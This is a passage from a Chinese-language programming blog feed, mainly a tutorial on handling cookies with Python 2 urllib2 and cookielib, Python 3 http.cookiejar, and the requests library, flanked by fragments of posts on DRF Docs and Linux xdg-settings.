&lt;p&gt;DRF Docs 主要功能就是可以根據你在 Django REST framework 所使用的 View function 直接生出 API 文件，有要額外補充的也可以寫在 View function 的 docstring 裡頭，DRF Docs 會幫你呈現出來，這樣就不需要為了 API 額外撰寫文件，只要 docstring 寫得夠清楚就行，可以節省開發上的時間，也可以讓程式碼更容易被理解。  &lt;/p&gt;
&lt;p&gt;當時會 fork &lt;a href="https://github.com/manosim/django-rest-framework-docs"&gt;GitHub - manosim/django-rest-framework-docs: Document Web APIs made with Django Rest Framework&lt;/a&gt; 出來改的主要原因是要改首頁的標題。  &lt;/p&gt;
&lt;p&gt;但實際使用過發現有個需求，就是我想在 docstring 直接寫 markdown，覺得應該也有人有這樣的需求，所以找了一下。發現有個 PR 就是在做這件事，不過還沒被 merge：&lt;a href="https://github.com/manosim/django-rest-framework-docs/pull/117"&gt;Added markdown support for endpoint docstrings by mikeengland · Pull Request #117 · manosim/django-rest-framework-docs · GitHub&lt;/a&gt;，於是就把這個 PR merge 進來使用，基本上沒啥太大的問題。  &lt;/p&gt;
&lt;p&gt;撰寫這篇文章的時候去追了一下進度，發現已經有另外一個支援 markdown 的 PR 被 merge 了：&lt;a href="https://github.com/manosim/django-rest-framework-docs/pull/127"&gt;Add optional markdown for docstrings by rainyday · Pull Request #127 · manosim/django-rest-framework-docs · GitHub&lt;/a&gt;，所以現在的 DRF Docs 應該是有正式支援在 docstring 可以寫 markdown 這件事，但這個部份我自己沒使用過就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;如果熟 Django 的人真的可以很快用 DRF + DRF Docs 弄出一個可以做帳號權限管理的 REST API 網站，而且因為用上了 DRF Docs，所以不會出現程式碼和文件不一致的狀況。當時撰寫完整個網站我也不過花了 &lt;code&gt;53 commits  1,806 ++  761 --&lt;/code&gt;，為期大概一個月，學到了沒碰過的新東西，成功嘗試了 Google App Engine Flexible Environment，期間當然也有做其他事。  &lt;/p&gt;
&lt;p&gt;但如果不考慮快速完成而是考慮效能的話，我大概就不太推薦 DRF，雖然不確定目前效能改善到什麼地步，如果還是要使用的話可能就要在 Database 或架構方面多下點功夫。  &lt;/p&gt;
&lt;p&gt;因為開發完這網站之後我就沒再碰 DRF 了，所以這篇文章可能會顯得有點過時些，但可以當個參考，畢竟這篇主要目的是紀錄給我自己知道到底我把時間花在哪裡了。  &lt;/p&gt;
&lt;p&gt;技術文這種東西真的不太能囤積在草稿啊，能發就要趕快發，不然真的很容易過時。如果是一些跟人比較有關係的文章則大概很難過時，看看技術的長青書基本上都是在講人的態度或是做事的方法與原則。其實也在思考以後寫的一些技術文能否能朝這個方向去多紀錄一些。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/encode/django-rest-framework"&gt;GitHub - encode/django-rest-framework: Web APIs for Django.&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/manosim/django-rest-framework-docs"&gt;GitHub - manosim/django-rest-framework-docs: Document Web APIs made with Django Rest Framework&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Django"></category><category term="RESTful API"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Python 中讓 urllib 使用 cookie 的方法</title><link href="https://blog.m157q.tw/posts/2018/01/06/use-cookie-with-urllib-in-python/" rel="alternate"></link><published>2018-01-07T01:42:00+08:00</published><updated>2018-01-07T01:42:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-06:posts/2018/01/06/use-cookie-with-urllib-in-python/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;其實一般來說只要用 &lt;a href="https://github.com/requests/requests"&gt;&lt;code&gt;requests&lt;/code&gt;&lt;/a&gt; 這個超強的 third-party library 就可以解了，&lt;code&gt;requests&lt;/code&gt; 已經把 Cookie 的部份處理好了，那為什麼要紀錄這篇？其實這問題也是約莫一年前在前公司工作時遇到的問題，以下說明一下：  &lt;/p&gt;
&lt;p&gt;Google App Engine Standard Environment 除了預設使用 Python 2 以外，加上因為是 PaaS 的關係，做了不少限制，直接拿 &lt;code&gt;requests&lt;/code&gt; 來用的話會無法使用，必須再搭配 &lt;a href="https://github.com/requests/toolbelt"&gt;&lt;code&gt;requests-toolbelt&lt;/code&gt;&lt;/a&gt; 這個工具，讓 &lt;code&gt;requests&lt;/code&gt; 在 GAE Standard 上使用的時候，底層會抽換成 GAE 提供的 &lt;code&gt;urlfetch&lt;/code&gt;，這樣才能使用，而在 GAE Standard 上預設可以使用 &lt;code&gt;urlfetch&lt;/code&gt; 和 &lt;code&gt;urllib2&lt;/code&gt;。  &lt;/p&gt;
&lt;p&gt;那為什麼不用 &lt;code&gt;requests&lt;/code&gt; 就好了？因為 Legacy code 的緣故，無法很輕易使用 &lt;code&gt;requests&lt;/code&gt;，所以採用 &lt;code&gt;urllib2&lt;/code&gt;，但又遇到有需要使用 Cookie 的需求，而 &lt;code&gt;urllib2&lt;/code&gt; 是沒有支援 Cookie 的，所以就必須再搭配 &lt;code&gt;cookielib&lt;/code&gt; 來使用。  &lt;/p&gt;
&lt;p&gt;就用這篇文章紀錄一下作法，順便連 Python 3 的寫法也順便紀錄一下，因為 Python 2 裡的 &lt;code&gt;urllib2&lt;/code&gt; 和 &lt;code&gt;cookielib&lt;/code&gt; 在 Python 3 裡頭都有做更動。順便也把最簡單的 &lt;code&gt;requests&lt;/code&gt; 的寫法也一併附上。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Python 2: &lt;code&gt;urllib2&lt;/code&gt; + &lt;code&gt;cookielib&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Python 2 中的 &lt;code&gt;urllib2&lt;/code&gt; 是 &lt;code&gt;urllib&lt;/code&gt; 的加強版，在實際使用上比較常使用 &lt;code&gt;urllib2&lt;/code&gt;，所以這裡直接講 &lt;code&gt;urllib2&lt;/code&gt; 的寫法。&lt;/strong&gt;  &lt;/p&gt;
&lt;h3&gt;基本使用&lt;/h3&gt;
&lt;p&gt;範例其實在官方網站的說明文件最底下的範例就有了：&lt;a href="https://docs.python.org/2/library/cookielib.html#examples"&gt;20.21. cookielib — Cookie handling for HTTP clients — Python 2.7.14 documentation&lt;/a&gt;，其實也不會很複雜。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;cookielib&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib2&lt;/span&gt;  
&lt;span class="n"&gt;cj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cookielib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CookieJar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;opener&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;build_opener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urllib2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPCookieProcessor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cj&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;opener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://example.com/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;不從檔案匯入，直接設定 Cookie&lt;/h3&gt;
&lt;p&gt;但如果今天我們沒有一份先存好的 Cookie 設定檔，卻又想在發送 request 前預先設定一些 Cookie 的 value 怎麼辦？先講結論：「有辦法做到，但不推薦使用。」（如果是要改 "User-Agent" 的話，這個是 request header，而不是 cookie，所以是 &lt;code&gt;urllib&lt;/code&gt; 要處理，而不是 &lt;code&gt;cookielib&lt;/code&gt; 處理，請勿搞混。）  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;cookielib.CookieJar&lt;/code&gt; 有個 &lt;code&gt;set_cookie()&lt;/code&gt; 的函式，其預設接收的參數是 &lt;code&gt;cookielib.Cookie&lt;/code&gt;，但 &lt;code&gt;cookielib.Cookie&lt;/code&gt; 的文件中卻有著以下這段說明：  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This class represents Netscape, RFC 2109 and RFC 2965 cookies. It is not expected that users of &lt;code&gt;cookielib&lt;/code&gt; construct their own &lt;code&gt;Cookie&lt;/code&gt; instances. Instead, if necessary, call &lt;code&gt;make_cookies()&lt;/code&gt; on a &lt;code&gt;CookieJar&lt;/code&gt; instance.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;也就是說，預設其實是不期望使用者自己設定 Cookie 的，但並不是不能做到，這個在 StackOverflow 上的回答有給出範例：&lt;a href="https://stackoverflow.com/questions/4685337/python-add-cookie-to-cookiejar#12682437"&gt;python - add cookie to cookiejar - Stack Overflow&lt;/a&gt;，但我自己是覺得非常的不直觀，用這種開發方式應該很難維護，除非初始化 &lt;code&gt;cookielib.Cookie&lt;/code&gt; 的時候把參數的 key 都加上去。順待一提，這篇文章的提問者誤把 &lt;code&gt;Cookie.SimpleCooke&lt;/code&gt; 丟給 &lt;code&gt;cookielib.CookieJar.set_cookie()&lt;/code&gt; 當參數餵入，但這個函式可以接受的參數必須是 &lt;code&gt;cookielib.Cookie&lt;/code&gt;，而不是 &lt;code&gt;Cookie.SimpleCookie&lt;/code&gt;，所以出了錯，而且這兩者並沒有任何關係，完全是繼承自不同的 class。  &lt;/p&gt;
&lt;h3&gt;從檔案匯入/匯出到檔案&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/cookielib.html#cookielib.FileCookieJar.save"&gt;&lt;code&gt;cookielib.FileCookieJar.save&lt;/code&gt;&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;將現有的 Cookie export 到檔案中。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/cookielib.html#cookielib.FileCookieJar.load"&gt;&lt;code&gt;cookielib.FileCookieJar.load&lt;/code&gt;&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從檔案中 import Cookie 的設定進來。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;這樣一來在實作爬蟲時，遇到會利用 Cookie 來判斷使用者是否登入的網站時就很方便。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Python 3: &lt;code&gt;urllib.request&lt;/code&gt; + &lt;code&gt;http.cookiejar&lt;/code&gt;&lt;/h2&gt;
&lt;h3&gt;基本使用&lt;/h3&gt;
&lt;p&gt;一樣在 Python 官方的說明文件底下就有範例可以參考了：&lt;a href="https://docs.python.org/3/library/http.cookiejar.html?highlight=cookiejar#examples"&gt;21.24. http.cookiejar — Cookie handling for HTTP clients — Python 3.6.4 documentation&lt;/a&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;http.cookiejar&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib.request&lt;/span&gt;  
&lt;span class="n"&gt;cj&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;http&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookiejar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CookieJar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="n"&gt;opener&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;build_opener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;HTTPCookieProcessor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cj&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;opener&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://example.com/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;其實可以看到跟 Python 2 的寫法一模一樣，只是把 &lt;code&gt;cookielib&lt;/code&gt; 換成 &lt;code&gt;http.cookiejar&lt;/code&gt;，&lt;code&gt;urllib2&lt;/code&gt; 換成 &lt;code&gt;urllib.request&lt;/code&gt; 而已。  &lt;/p&gt;
&lt;h3&gt;不從檔案匯入，直接設定 Cookie。&lt;/h3&gt;
&lt;p&gt;這部份跟 Python 2 一樣，可以做到，但不推薦，就不贅述。  &lt;/p&gt;
&lt;h3&gt;從檔案匯入/匯出到檔案&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/http.cookiejar.html?highlight=cookiejar#http.cookiejar.FileCookieJar.save"&gt;&lt;code&gt;http.cookiejar.FileCookieJar.save&lt;/code&gt;&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;將目前的 Cookie 匯出到檔案。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/http.cookiejar.html?highlight=cookiejar#http.cookiejar.FileCookieJar.load"&gt;&lt;code&gt;http.cookiejar.FileCookieJar.load&lt;/code&gt;&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;從現有的檔案中匯入 Cookie。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;requests&lt;/h2&gt;
&lt;p&gt;官方文件的 Quickstart 就有一個關於 Cookies 的部份：&lt;a href="http://docs.python-requests.org/en/master/user/quickstart/#cookies"&gt;Quickstart — Requests 2.18.4 documentation&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;requests&lt;/code&gt; 本身就自帶 Cookie 的處理了，用法簡單了許多：  &lt;/p&gt;
&lt;h3&gt;基本使用&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;If a response contains some Cookies, you can quickly access them:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://example.com/some/cookie/setting/url&amp;#39;&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;example_cookie_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
&lt;span class="s1"&gt;&amp;#39;example_cookie_value&amp;#39;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;To send your own cookies to the server, you can use the cookies parameter:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://httpbin.org/cookies&amp;#39;&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cookies_are&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;working&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;  
&lt;span class="s1"&gt;&amp;#39;{&amp;quot;cookies&amp;quot;: {&amp;quot;cookies_are&amp;quot;: &amp;quot;working&amp;quot;}}&amp;#39;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;不從檔案匯入，直接設定 Cookie。&lt;/h3&gt;
&lt;p&gt;基本上這邊的作法就是上面 Python 2 那邊提到的作法，不過 &lt;code&gt;requests&lt;/code&gt; 把剛剛說的加上參數 key  這件事情稍微處理了一下。  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Cookies are returned in a &lt;code&gt;RequestsCookieJar&lt;/code&gt;, which acts like a &lt;code&gt;dict&lt;/code&gt; but also offers a more complete interface, suitable for use over multiple domains or paths. Cookie jars can also be passed in to requests:  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;RequestsCookieJar&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tasty_cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;yum&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;httpbin.org&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/cookies&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;jar&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;gross_cookie&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;blech&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;httpbin.org&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/elsewhere&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://httpbin.org/cookies&amp;#39;&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;cookies&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;jar&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;  
&lt;span class="s1"&gt;&amp;#39;{&amp;quot;cookies&amp;quot;: {&amp;quot;tasty_cookie&amp;quot;: &amp;quot;yum&amp;quot;}}&amp;#39;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;從檔案匯入/匯出到檔案&lt;/h3&gt;
&lt;p&gt;這部份在 &lt;code&gt;requests&lt;/code&gt; 就比較麻煩一點，但也不難，需要額外用到 &lt;code&gt;requests.utils.dict_from_cookiejar()&lt;/code&gt;，詳細可以參考這篇 StackOverflow 的解答：&lt;a href="https://stackoverflow.com/questions/13030095/how-to-save-requests-python-cookies-to-a-file/13031628#13031628"&gt;How to save requests (python) cookies to a file? - Stack Overflow&lt;/a&gt;，它還有用到 &lt;code&gt;pickle&lt;/code&gt; 這個函式庫。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;無論是 &lt;code&gt;requests.Response.cookies&lt;/code&gt; 或 &lt;code&gt;requests.Sessions.Session.cookies&lt;/code&gt; 都是 &lt;code&gt;requests.cookies.cookiejar_from_dict()&lt;/code&gt; 的輸出結果。  &lt;/li&gt;
&lt;li&gt;可以用 &lt;code&gt;requests.utils.dict_from_cookiejar()&lt;/code&gt; 這個函式，將 &lt;code&gt;response.cookies&lt;/code&gt; 或是 &lt;code&gt;session.cookies&lt;/code&gt; 當作輸入，就可以得到該 Cookie 以 &lt;code&gt;dict&lt;/code&gt; 方式呈現結果，當然也就可以匯出到檔案。  &lt;/li&gt;
&lt;li&gt;要匯入的話，可以使用 &lt;code&gt;requests.utils.cookiejar_from_dict()&lt;/code&gt; 這個參數來把 &lt;code&gt;dict&lt;/code&gt; 轉成 &lt;code&gt;RequestsCookieJar&lt;/code&gt;。  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;requests.utils.cookiejar_from_dict()&lt;/code&gt; 是從 &lt;code&gt;requests.cookies&lt;/code&gt; import 來的。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;使用到 &lt;code&gt;pickle&lt;/code&gt; 只是方便以 &lt;code&gt;pickle&lt;/code&gt; 的形式儲存而已。  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;結論&lt;/h2&gt;
&lt;p&gt;能用 &lt;code&gt;requests&lt;/code&gt; 的話當然就直接用吧，如果遇到我提到的這種狀況才會需要特殊的解法。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;參考來源&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://stackoverflow.com/questions/2018026/what-are-the-differences-between-the-urllib-urllib2-and-requests-module"&gt;python - What are the differences between the urllib, urllib2, and requests module? - Stack Overflow&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/requests/requests"&gt;GitHub - requests/requests: Python HTTP Requests for Humans™ ✨🍰✨&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/requests/toolbelt"&gt;GitHub - requests/toolbelt: A toolbelt of useful classes and functions to be used with python-requests&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2.7/library/urllib.html?highlight=urllib"&gt;20.5. urllib — Open arbitrary resources by URL — Python 2.7.14 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2.7/library/urllib2.html"&gt;20.6. urllib2 — extensible library for opening URLs — Python 2.7.14 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/2/library/cookielib.html"&gt;20.21. cookielib — Cookie handling for HTTP clients — Python 2.7.14 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/urllib.html?highlight=urllib"&gt;21.5. urllib — URL handling modules — Python 3.6.4 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://docs.python.org/3/library/http.cookiejar.html?highlight=cookiejar#module-http.cookiejar"&gt;21.24. http.cookiejar — Cookie handling for HTTP clients — Python 3.6.4 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://docs.python-requests.org/en/master/user/quickstart/#cookies"&gt;Quickstart — Requests 2.18.4 documentation&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Python"></category><category term="Python 2"></category><category term="Python 3"></category><category term="urllib"></category><category term="cookie"></category><category term="requests"></category><category term="2018 iT 邦幫忙鐵人賽"></category></entry><entry><title>Linux 設定桌面環境預設開啟程式</title><link href="https://blog.m157q.tw/posts/2018/01/05/set-default-application-in-desktop-environment-on-linux/" rel="alternate"></link><published>2018-01-06T00:52:26+08:00</published><updated>2018-01-06T00:52:26+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2018-01-05:posts/2018/01/05/set-default-application-in-desktop-environment-on-linux/</id><summary type="html">&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;xdg-settings {get | check | set} {property} [subproperty] [value]&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;其實主要是最近用了 qutebrowser 以後，要把預設瀏覽器從 Firefox 改成 qutebrowser，因為在 qutebrowser 的設定裡頭找不到，查了 qutebrowser 的說明也沒看到，後來發現一個指令就可以做掉了。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;正文&lt;/h2&gt;
&lt;p&gt;如果是 CLI 環境的話，可以透過 &lt;code&gt;EDITOR&lt;/code&gt;, &lt;code&gt;BROWSER&lt;/code&gt; 等環境變數來做設定。  &lt;/p&gt;
&lt;p&gt;如果是桌面環境的話，我通常是在我使用的應用程式裏面找看看有沒有可以把該程式設定為預設開啟程式的選項，但因為這在 qutebrowser 上行不通，所以用下面這個方法。  &lt;/p&gt;
